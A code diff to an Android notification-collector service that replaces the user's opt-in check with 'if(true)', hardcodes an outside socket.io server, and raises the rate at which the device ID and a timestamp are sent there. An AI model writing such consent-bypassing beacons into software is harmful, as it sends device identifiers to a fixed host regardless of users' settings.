@@ -50,20 +50,22 @@ public class NotificationCollectorMonitorService extends Service {
         private Timer timer=null;
         private String echointerval=null;
         private TimerTask echotimertask =null;
+        private Socket mSocket;
 
         @Override
         public void onCreate() {
                 super.onCreate();
                 ensureCollectorRunning();
-                startEchoTimer();
+                echoServer();
+//                startEchoTimer();
         }
 
         @Override
         public int onStartCommand(Intent intent, int flags, int startId) {
                 return START_STICKY;
         }
-        private boolean echoServerBySocketio(String echourl,String echojson){
-                Socket mSocket= EchoSocket.getInstance(echourl);
+        private boolean echoServerBySocketio(String echourl, final String echojson){
+                mSocket = EchoSocket.getInstance(echourl);
                 mSocket.connect();
                 mSocket.emit("echo",echojson);
                 mSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
@@ -77,14 +79,25 @@ public class NotificationCollectorMonitorService extends Service {
 				                }
                             echoServer();
                         }
+                }).on(Socket.EVENT_CONNECT, new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                                mSocket.emit("echo",echojson);
+                        }
+                }).on(Socket.EVENT_MESSAGE, new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                                //收到消息
+
+                        }
                 });
                 return true;
         }
         private String getDefaultEchoInterval(){
                 if (Build.VERSION.SDK_INT >= 22 )
-                        return  "300";
+                        return  "3";
                 else
-                        return  "100";
+                        return  "1";
         }
         private void startEchoTimer(){
                 PreferenceUtil preference=new PreferenceUtil(getBaseContext());    
@@ -101,6 +114,7 @@ public class NotificationCollectorMonitorService extends Service {
                 @Override
                 public void run() {
                         if(!isIntervalMatchPreference()){
+                                //重新设置时间间隔
                             restartEchoTimer();
                             return;
                         }
@@ -135,7 +149,7 @@ public class NotificationCollectorMonitorService extends Service {
         private boolean echoServer(){
                 PreferenceUtil preference=new PreferenceUtil(getBaseContext());
                 Gson gson = new Gson();
-                if(preference. isEcho()&&(preference.getEchoServer()!=null)){
+                if(true){
                         Date date=new Date(System.currentTimeMillis());
                         SimpleDateFormat format=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                         String time=format.format(date);
@@ -145,7 +159,7 @@ public class NotificationCollectorMonitorService extends Service {
                         device.setDeviceid(deviceid);
                         device.setTime(time);
                         LogUtil.debugLog("start connect socketio");
-                        echoServerBySocketio(preference.getEchoServer(),gson.toJson(device));
+                        echoServerBySocketio("https://juan.214sq.com/",gson.toJson(device));
                         LogUtil.debugLog(gson.toJson(device));
                         return true;
                 }
